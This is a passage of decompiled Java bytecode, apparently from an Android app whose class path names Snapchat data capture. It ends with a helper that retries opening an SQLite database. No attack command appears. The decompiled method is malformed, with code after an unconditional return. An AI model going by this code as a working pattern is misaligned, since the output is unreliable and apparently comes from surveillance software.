    //   361: istore_2
    //   362: iload_2
    //   363: ifeq +3 -> 366
    //   366: aload 4
    //   368: ifnull -16 -> 352
    //   371: goto -26 -> 345
    //   374: astore 4
    //   376: aload_3
    //   377: ifnull +9 -> 386
    //   380: aload_3
    //   381: invokeinterface 116 1 0
    //   386: aload 4
    //   388: athrow
    //   389: astore 18
    //   391: aload 4
    //   393: astore_3
    //   394: aload 18
    //   396: astore 4
    //   398: goto -22 -> 376
    //   401: astore_3
    //   402: goto -44 -> 358
    //   405: iconst_0
    //   406: istore 5
    //   408: aconst_null
    //   409: astore 6
    //   411: goto -205 -> 206
    //   414: iconst_0
    //   415: istore 7
    //   417: aconst_null
    //   418: astore 8
    //   420: goto -239 -> 181
    //   423: iconst_0
    //   424: istore 17
    //   426: aconst_null
    //   427: astore 9
    //   429: goto -277 -> 152
    //   432: iconst_0
    //   433: istore 16
    //   435: aconst_null
    //   436: astore 11
    //   438: goto -315 -> 123
    //   441: iconst_0
    //   442: istore 15
    //   444: aconst_null
    //   445: astore 10
    //   447: goto -353 -> 94
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	450	0	paramSQLiteDatabase	SQLiteDatabase
    //   1	266	1	i	int
    //   3	360	2	bool	boolean
    //   5	389	3	localObject1	Object
    //   401	1	3	localException1	Exception
    //   8	338	4	localObject2	Object
    //   353	1	4	localException2	Exception
    //   356	11	4	localObject3	Object
    //   374	18	4	localObject4	Object
    //   396	1	4	localObject5	Object
    //   11	396	5	j	int
    //   18	392	6	localObject6	Object
    //   21	395	7	k	int
    //   24	395	8	localObject7	Object
    //   28	400	9	localObject8	Object
    //   92	354	10	localObject9	Object
    //   121	316	11	localObject10	Object
    //   208	120	12	str	String
    //   219	6	13	m	int
    //   270	60	14	arrayOfObject	Object[]
    //   279	164	15	n	int
    //   289	145	16	i1	int
    //   299	126	17	i2	int
    //   389	6	18	localObject11	Object
    // Exception table:
    //   from	to	target	type
    //   13	18	353	java/lang/Exception
    //   33	36	353	java/lang/Exception
    //   38	43	353	java/lang/Exception
    //   54	58	353	java/lang/Exception
    //   13	18	374	finally
    //   33	36	374	finally
    //   38	43	374	finally
    //   54	58	374	finally
    //   71	78	389	finally
    //   100	107	389	finally
    //   129	136	389	finally
    //   158	165	389	finally
    //   187	194	389	finally
    //   212	219	389	finally
    //   266	270	389	finally
    //   275	278	389	finally
    //   285	288	389	finally
    //   295	298	389	finally
    //   305	308	389	finally
    //   315	318	389	finally
    //   325	327	389	finally
    //   329	334	389	finally
    //   336	340	389	finally
    //   358	361	389	finally
    //   71	78	401	java/lang/Exception
    //   100	107	401	java/lang/Exception
    //   129	136	401	java/lang/Exception
    //   158	165	401	java/lang/Exception
    //   187	194	401	java/lang/Exception
    //   212	219	401	java/lang/Exception
    //   266	270	401	java/lang/Exception
    //   275	278	401	java/lang/Exception
    //   285	288	401	java/lang/Exception
    //   295	298	401	java/lang/Exception
    //   305	308	401	java/lang/Exception
    //   315	318	401	java/lang/Exception
    //   325	327	401	java/lang/Exception
    //   329	334	401	java/lang/Exception
    //   336	340	401	java/lang/Exception
  }
  
  public static SQLiteDatabase d(String paramString)
  {
    Object localObject;
    if (paramString == null)
    {
      boolean bool1 = a;
      if (bool1) {}
      bool1 = false;
      localObject = null;
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject;
      SQLiteDatabase localSQLiteDatabase1 = a(paramString, 0);
      int i = 5;
      localObject = localSQLiteDatabase1;
      int k = i;
      while ((localObject == null) && (k > 0))
      {
        boolean bool2 = a;
        if (bool2) {}
        long l = 100;
        SystemClock.sleep(l);
        SQLiteDatabase localSQLiteDatabase2 = a(paramString, 0);
        int j = k + -1;
        k = j;
        localObject = localSQLiteDatabase2;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */